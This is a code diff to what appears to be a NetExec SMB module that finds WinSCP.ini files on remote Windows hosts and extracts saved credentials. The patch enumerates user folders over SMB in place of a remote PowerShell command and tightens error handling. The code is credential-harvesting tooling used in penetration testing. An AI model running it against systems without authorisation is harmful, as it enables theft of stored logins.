@@ -8,6 +8,7 @@ import traceback
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
+from impacket.smbconnection import SessionError
 from urllib.parse import unquote
 from io import BytesIO
 import re
@@ -20,8 +21,6 @@ class NXCModule:
     name = "winscp"
     description = "Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials."
     supported_protocols = ["smb"]
-    opsec_safe = True
-    multiple_hosts = True
 
     def options(self, context, module_options):
         r"""
@@ -306,7 +305,11 @@ class NXCModule:
             context.log.fail(f"UNEXPECTED ERROR: {e}")
             context.log.debug(traceback.format_exc())
         finally:
-            remote_ops.finish()
+            try:
+                remote_ops.finish()
+            except rrp.DCERPCSessionError as e:
+                # Likely can't stop rrp due to other services dependending on it
+                context.log.debug(f"Error finishing remote operations: {e}")
 
     # ==================== Handle Configs ====================
     def decode_config_file(self, context, confFile):
@@ -346,14 +349,19 @@ class NXCModule:
                 context.log.debug(traceback.format_exc())
         else:
             context.log.display("Looking for WinSCP creds in User documents and AppData...")
-            output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
-            users = [row.strip() for row in output.split("\r\n")[2:]]
+            users = []
+            out = connection.conn.listPath(self.share, "\\Users\\*")
+            for obj in out:
+                if obj.get_longname() in [".", ".."] or not obj.is_directory():
+                    continue
+                else:
+                    users.append(obj.get_longname())
 
             # Iterate over found users and default paths to look for WinSCP.ini files
             for user in users:
                 paths = [
-                    ("\\Users\\" + user + "\\Documents\\WinSCP.ini"),
-                    ("\\Users\\" + user + "\\AppData\\Roaming\\WinSCP.ini"),
+                    (f"\\Users\\{user}\\Documents\\WinSCP.ini"),
+                    (f"\\Users\\{user}\\AppData\\Roaming\\WinSCP.ini"),
                 ]
                 for path in paths:
                     conf_file = ""
@@ -362,9 +370,12 @@ class NXCModule:
                         connection.conn.getFile(self.share, path, buf.write)
                         conf_file = buf.getvalue().decode()
                         context.log.success(f"Found config file at '{self.share + path}'! Extracting credentials...")
-                    except Exception as e:
+                    except SessionError as e:
                         context.log.debug(f"No config file found at '{self.share + path}': {e}")
-                    if conf_file:
+                    except Exception as e:
+                        context.log.fail(f"Error getting config file at '{self.share + path}': {e}")
+                        context.log.debug(traceback.format_exc())
+                    else:
                         self.decode_config_file(context, conf_file)
 
     def on_admin_login(self, context, connection):
